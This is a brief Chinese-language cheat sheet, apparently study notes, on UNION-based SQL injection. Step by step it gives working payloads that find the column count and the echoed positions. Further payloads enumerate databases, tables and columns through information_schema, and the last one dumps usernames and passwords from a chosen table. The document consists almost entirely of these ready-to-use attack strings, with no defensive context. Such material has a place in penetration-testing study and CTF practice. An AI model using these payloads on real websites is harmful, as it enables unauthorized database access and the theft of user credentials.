<!-- this is test; -->
4:union注入（适合有回显，例如输入1=1和1=2会有不同的回显）  
判断表字段数
?id=1' order by 3--+
判断回显位
?id=1' union select 1,2,3#
爆库
union select 1,2,group_concat(schema_name) from information_schema.schemata --+
爆表
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名'--+
爆列名
union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' --+
爆数据
id=-1' union select 1,2,group_concat(username,password) from 表名 --+
